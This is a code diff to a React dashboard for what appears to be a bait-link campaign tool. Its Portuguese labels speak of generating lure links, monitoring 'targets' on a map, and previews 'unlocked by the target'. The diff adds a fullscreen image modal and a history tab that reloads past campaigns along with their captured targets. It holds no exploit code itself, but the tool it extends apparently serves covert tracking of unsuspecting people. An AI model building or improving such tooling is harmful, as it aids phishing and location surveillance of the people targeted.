@@ -126,6 +126,7 @@ export default function App() {
   const [campaignExpiry, setCampaignExpiry] = useState(''); // data de expiração
   const [pollBackoff, setPollBackoff] = useState(0);        // contador de polls sem novidades
   const [contentUnlocked, setContentUnlocked] = useState(false); // preview desbloqueada pelo alvo
+  const [showFullscreenImage, setShowFullscreenImage] = useState(false); // tela cheia para imagem no preview
   
   // Terminal logs state
   const [logs, setLogs] = useState([
@@ -628,18 +629,26 @@ export default function App() {
             </button>
           ) : (
             <button
-              onClick={() => {
-                if (previewCampaign?.image) {
-                  const w = window.open('');
-                  w.document.write(`<!DOCTYPE html><html><body style="margin:0;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh"><img src="${previewCampaign.image}" style="max-width:100%;max-height:100vh;object-fit:contain"></body></html>`);
-                }
-              }}
+              onClick={() => setShowFullscreenImage(true)}
               style={{ background:'#10b981', border:'none', color:'#fff', padding:'11px 28px', borderRadius:'8px', fontWeight:'bold', cursor:'pointer', fontSize:'0.9rem', width:'100%' }}
             >
               🖼️ Abrir Mídia em Tela Cheia
             </button>
           )}
         </div>
+
+        {/* Modal de imagem em tela cheia na própria página */}
+        {showFullscreenImage && previewCampaign?.image && (
+          <div 
+            style={{ position:'fixed', inset:0, background:'rgba(0,0,0,0.95)', zIndex:99999, display:'flex', justifyContent:'center', alignItems:'center', cursor:'zoom-out' }}
+            onClick={() => setShowFullscreenImage(false)}
+          >
+            <img src={previewCampaign.image} style={{ maxWidth:'100%', maxHeight:'100vh', objectFit:'contain' }} />
+            <div style={{ position:'absolute', top:'20px', right:'20px', color:'#fff', background:'rgba(255,255,255,0.2)', width:'40px', height:'40px', borderRadius:'50%', display:'flex', justifyContent:'center', alignItems:'center', fontWeight:'bold', fontSize:'1.2rem' }}>
+              X
+            </div>
+          </div>
+        )}
       </div>
     );
   }
@@ -758,6 +767,16 @@ export default function App() {
             }}
           >
             2. Monitor de Alvos ({targets.length})
+          </button>
+          <button 
+            className={`cyber-button ${activeTab === 'history' ? 'active' : 'cyber-button-blue'}`}
+            style={{ padding: '8px 20px', fontSize: '0.85rem' }}
+            onClick={() => {
+              setActiveTab('history');
+              addLog('Acessando Histórico de Campanhas.', 'info');
+            }}
+          >
+            3. Histórico
           </button>
         </div>
       </header>
@@ -889,6 +908,30 @@ export default function App() {
                 disabled={isGenerating}
               >
                 {isGenerating ? 'Enviando...' : 'Gerar Link Isca'}
+              </button>
+            </div>
+          )}
+
+          {activeTab === 'history' && (
+            <div className="cyber-panel cyber-panel-blue">
+              <div className="cyber-title blue">
+                <RefreshCw size={18} />
+                Navegação
+              </div>
+              <p style={{ fontSize: '0.85rem', color: 'var(--text-muted)' }}>
+                Selecione uma campanha à direita para restaurar o estado completo.
+              </p>
+              <button 
+                className="cyber-button"
+                style={{ width: '100%', marginTop: '15px', border: '1px solid var(--neon-alert)', color: 'var(--neon-alert)' }}
+                onClick={() => {
+                  if(window.confirm('Tem certeza que deseja apagar o histórico local? As campanhas no servidor continuarão existindo.')) {
+                    setCampaignIndex([]);
+                    addLog('Histórico local apagado.', 'system');
+                  }
+                }}
+              >
+                Limpar Histórico Local
               </button>
             </div>
           )}
@@ -1225,7 +1268,8 @@ export default function App() {
           )}
 
           {/* MAP & LOCATION INFORMATION */}
-          <div style={{ flex: 1, display: 'grid', gridTemplateRows: '1fr auto', gap: '20px' }}>
+          {activeTab === 'monitor' && (
+            <div style={{ flex: 1, display: 'grid', gridTemplateRows: '1fr auto', gap: '20px' }}>
             
             {/* The Leaflet Map container */}
             <div style={{ height: '450px', position: 'relative' }}>
@@ -1374,6 +1418,72 @@ export default function App() {
             </div>
 
           </div>
+          )}
+
+          {/* If history tab, show History */}
+          {activeTab === 'history' && (
+            <div className="cyber-panel cyber-panel-blue" style={{ flex: 1, overflowY: 'auto' }}>
+              <div className="cyber-title blue" style={{ marginBottom: '20px' }}>
+                <RefreshCw size={18} />
+                Histórico de Campanhas Criadas
+              </div>
+              
+              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(320px, 1fr))', gap: '15px' }}>
+                {campaignIndex.length === 0 ? (
+                  <div style={{ color: 'var(--text-muted)', fontSize: '0.9rem' }}>Nenhuma campanha no histórico local. Crie uma para começar!</div>
+                ) : (
+                  campaignIndex.map(camp => (
+                    <div 
+                      key={camp.id}
+                      style={{ 
+                        background: 'rgba(5, 8, 17, 0.6)', 
+                        border: '1px solid rgba(0, 218, 255, 0.3)', 
+                        padding: '15px', 
+                        borderRadius: '8px',
+                        cursor: 'pointer',
+                        transition: 'all 0.2s',
+                        display: 'flex',
+                        flexDirection: 'column',
+                        gap: '8px'
+                      }}
+                      onMouseOver={e => { e.currentTarget.style.borderColor = 'var(--neon-blue)'; e.currentTarget.style.background = 'rgba(0, 218, 255, 0.05)'; }}
+                      onMouseOut={e => { e.currentTarget.style.borderColor = 'rgba(0, 218, 255, 0.3)'; e.currentTarget.style.background = 'rgba(5, 8, 17, 0.6)'; }}
+                      onClick={async () => {
+                        addLog(`Carregando dados da campanha [${camp.id}]...`, 'system');
+                        try {
+                          const data = await apiGet(camp.id, camp.secretKey);
+                          setActiveCampaignId(camp.id);
+                          setActiveCampaignKey(camp.secretKey);
+                          setGeneratedLink(`${window.location.origin}/preview?id=${camp.id}`);
+                          setOperatorUrl(`${window.location.origin}/?operator=1&id=${camp.id}&key=${camp.secretKey}`);
+                          setTitle(data.title || camp.title || '');
+                          setDescription(data.description || '');
+                          if (data.image) setImagePreview(data.image);
+                          if (data.targets) setTargets(data.targets);
+                          setActiveTab('monitor');
+                          addLog(`Histórico carregado com sucesso. ${data.targets?.length || 0} alvos encontrados.`, 'success');
+                        } catch (err) {
+                          addLog(`Erro ao carregar histórico: ${err.message}`, 'error');
+                          alert('Erro ao carregar dados. A campanha pode ter expirado ou a chave é inválida.');
+                        }
+                      }}
+                    >
+                      <div style={{ fontWeight: 'bold', color: 'var(--neon-blue)', fontSize: '1.05rem', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>
+                        {camp.title || 'Sem título'}
+                      </div>
+                      <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.75rem', color: 'var(--text-muted)' }}>
+                        <span style={{ fontFamily: 'var(--font-mono)' }}>ID: {camp.id.slice(-6).toUpperCase()}</span>
+                        <span>{new Date(camp.createdAt).toLocaleDateString()}</span>
+                      </div>
+                      <div style={{ marginTop: '5px', fontSize: '0.75rem', color: 'var(--text-main)', borderTop: '1px dashed rgba(0, 218, 255, 0.2)', paddingTop: '8px', textAlign: 'center' }}>
+                        Clique para carregar no Monitor
+                      </div>
+                    </div>
+                  ))
+                )}
+              </div>
+            </div>
+          )}
 
         </div>
 
